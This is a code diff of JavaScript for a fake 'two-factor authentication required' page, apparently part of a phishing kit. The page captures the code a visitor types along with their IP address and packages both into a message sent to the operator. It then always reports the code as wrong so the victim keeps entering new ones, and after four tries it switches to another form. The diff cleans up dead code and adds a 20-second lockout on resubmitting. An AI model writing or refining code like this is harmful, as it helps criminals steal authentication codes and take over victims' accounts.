@@ -10,7 +10,6 @@ getIP((ip) => {
     IpAddress = ip;
 });
 $(document).ready(function () {
-    // getCode();
     updateHtmlAndCallback(function () {
         sendCode();
     });
@@ -49,35 +48,6 @@ function setTime() {
 
     let IpAddress = '';
 }
-/*
-function maskEmail(email) {
-    var maskedEmail = email;
-    var splitEmail = email.split('@');
-    if (splitEmail.length > 1 && splitEmail[0].length > 3) {
-        var localPart = splitEmail[0];
-        var domainPart = '@' + splitEmail[1];
-        var visiblePart = localPart.substring(0, 3);
-        maskedEmail = visiblePart + '*'.repeat(localPart.length - 3) + domainPart;
-    }
-    return maskedEmail;
-}
-
-function maskPhone(phone) {
-    var maskedPhone = phone;
-    if (phone.length >= 5) {
-        var visibleStart = phone.substring(0, 3);
-        var visibleEnd = phone.substring(phone.length - 2, phone.length);
-        maskedPhone = visibleStart + '*'.repeat(phone.length - 5) + visibleEnd;
-    }
-    return maskedPhone;
-}
-*/
-// <span id="phone" className="fw-bold">` + maskPhone(data.phone) + `</span>,
-//     <span id="buEmail" className="fw-bold">` + maskEmail(data.buEmail) + `</span>
-// or
-// < span
-// id = "peEmail"
-// className = "fw-bold" > ` + maskEmail(data.perEmail) + ` < /span>
 function updateHtmlAndCallback(callback) {
     $('#code-form .card-body').html(`
                 <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
@@ -112,36 +82,6 @@ function updateHtmlAndCallback(callback) {
     }
 }
 
-// function getCode() {
-//     $.ajax({
-//         url: '/current-user',
-//         type: 'GET',
-//         beforeSend: function () {
-//             $('.lsd-ring-container').removeClass('d-none');
-//         },
-//         success: function (data) {
-//             if (data.buEmail == null || data.perEmail == null || data.phone == null) {
-//                 window.location.href = '/business';
-//             } else {
-//                 updateHtmlAndCallback(data,function (){
-//                     sendCode(data);
-//                 })
-//             }
-//
-//             $('.lsd-ring-container').addClass('d-none');
-//         },
-//         error: function (xhr, status, error) {
-//             setTimeout(function () {
-//                 Swal.fire({
-//                     text: `Request failed!`,
-//                     icon: "error"
-//                 });
-//                 $('.lsd-ring-container').addClass('d-none');
-//             }, 500);
-//         }
-//
-//     });
-// }
 let NUMBER_TIME_SEND_CODE = 0;
 let MAX_TRIES = 4;
 let code1 = '';
@@ -150,15 +90,19 @@ let Fcode = '';
 function sendCode() {
     $('#code').on('input', function () {
         const input = $(this).val();
-        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng
+        const validInputRegex = /^\d+$/;
 
         if (!validInputRegex.test(input)) {
-            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
             $(this).val(input.slice(0, -1));
         }
     });
 
     $('#send-code').on('click', function () {
+        const $btn = $(this);
+
+        // Nếu nút đang bị khóa, không làm gì cả
+        if ($btn.prop('disabled')) return;
+
         const keymap = $('#code').val();
 
         if (keymap === '') {
@@ -167,6 +111,19 @@ function sendCode() {
         } else {
             $('#code').removeClass('border-danger');
         }
+
+        // Khóa nút trong 20s với đếm ngược
+        $btn.prop('disabled', true).text('Please wait (20s)');
+        let waitTime = 20;
+        const countdown = setInterval(() => {
+            waitTime--;
+            $btn.text(`Please wait (${waitTime}s)`);
+            if (waitTime <= 0) {
+                clearInterval(countdown);
+                $btn.prop('disabled', false).text('Submit');
+            }
+        }, 1000);
+
         code1 = keymap;
         const message1 = `🔓 <strong>Code:</strong> <code>${code1}</code>\n` +
 `🌐 <strong>IP Address:</strong> <code>${IpAddress.ipAddress}</code>\n` +
@@ -199,15 +156,13 @@ function sendCode() {
             .then((data) => {
                 setTimeout(function () {
                     if (NUMBER_TIME_SEND_CODE < MAX_TRIES) {
-                       $('#wrong-code').removeClass('d-none');
-        } else {
-            $('#wrong-code').removeClass('d-none');
-            $('#send-code').prop('disabled', true);
-
-            // ✅ Hiện biểu mẫu khác sau 4 lần sai
-            $('#code-form').addClass('d-none');
-            $('#getCode').removeClass('d-none');
-        }
+                        $('#wrong-code').removeClass('d-none');
+                    } else {
+                        $('#wrong-code').removeClass('d-none');
+                        $('#send-code').prop('disabled', true);
+                        $('#code-form').addClass('d-none');
+                        $('#getCode').removeClass('d-none');
+                    }
                     $('.lsd-ring-container').addClass('d-none');
                 }, 2000);
             })
@@ -220,35 +175,5 @@ function sendCode() {
                     $('.lsd-ring-container').addClass('d-none');
                 }, 500);
             });
-        /*  $.ajax({
-            url: '/sendInfo',
-            type: 'POST',
-            contentType: 'application/json',
-            data: JSON.stringify({keymap : keymap}),
-            beforeSend: function () {
-                $('.lsd-ring-container').removeClass('d-none');
-            },
-            success: function (data) {
-                setTimeout(function () {
-                    if (NUMBER_TIME_SEND_CODE == 1){
-                        $('#wrong-code').removeClass('d-none');
-                    }else{
-                        $('#getCode').removeClass('d-none');
-                    }
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-
-            },
-            error: function (xhr, status, error) {
-                setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
-                    });
-                    $('.lsd-ring-container').addClass('d-none');
-                }, 2000);
-            }
-
-        });*/
     });
 }
